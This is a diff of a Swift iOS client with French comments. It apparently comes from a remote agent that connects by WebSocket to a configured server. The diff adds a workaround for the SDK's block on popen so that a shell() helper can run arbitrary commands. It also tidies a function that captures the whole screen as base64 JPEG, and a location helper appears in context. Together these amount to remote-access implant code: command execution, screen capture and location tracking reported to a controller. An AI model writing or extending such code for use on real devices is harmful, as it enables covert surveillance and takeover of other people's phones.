@@ -13,6 +13,14 @@ let SERVER_IP   = "192.168.1.22"   // FILL: IP de ton ordi
 let SERVER_PORT = 4747
 let DEVICE_ID   = ProcessInfo.processInfo.environment["HOSTNAME"] ?? UUID().uuidString
 
+// ─── POPEN BYPASS (Swift marque popen unavailable sur iOS SDK) ───────────────
+
+@_silgen_name("popen")
+private func _popen(_ command: UnsafePointer<CChar>?, _ mode: UnsafePointer<CChar>?) -> UnsafeMutablePointer<FILE>?
+
+@_silgen_name("pclose")
+private func _pclose(_ stream: UnsafeMutablePointer<FILE>?) -> Int32
+
 // ─── LOCATION HELPER ─────────────────────────────────────────────────────────
 
 class LocationHelper: NSObject, CLLocationManagerDelegate {
@@ -170,15 +178,14 @@ class AgentCore: NSObject, URLSessionWebSocketDelegate {
 
     // ─── HELPERS ─────────────────────────────────────────────────────────────
 
-    // popen — disponible sur iOS via Darwin, pas de Process nécessaire
     func shell(_ cmd: String) -> String {
-        guard let pipe = popen(cmd, "r") else { return "popen failed" }
+        guard let pipe = _popen(cmd, "r") else { return "popen failed" }
         var output = ""
         var buffer = [CChar](repeating: 0, count: 512)
         while fgets(&buffer, Int32(buffer.count), pipe) != nil {
             output += String(cString: buffer)
         }
-        pclose(pipe)
+        _ = _pclose(pipe)
         return output
     }
 
@@ -186,11 +193,10 @@ class AgentCore: NSObject, URLSessionWebSocketDelegate {
         let bounds   = UIScreen.main.bounds
         let renderer = UIGraphicsImageRenderer(size: bounds.size)
         let img = renderer.image { _ in
-            // iOS 15+ — UIWindowScene
-            let scene = UIApplication.shared.connectedScenes
+            UIApplication.shared.connectedScenes
                 .compactMap { $0 as? UIWindowScene }
-                .first
-            scene?.windows.first?.drawHierarchy(in: bounds, afterScreenUpdates: true)
+                .first?.windows.first?
+                .drawHierarchy(in: bounds, afterScreenUpdates: true)
         }
         return img.jpegData(compressionQuality: 0.5)?.base64EncodedString()
     }
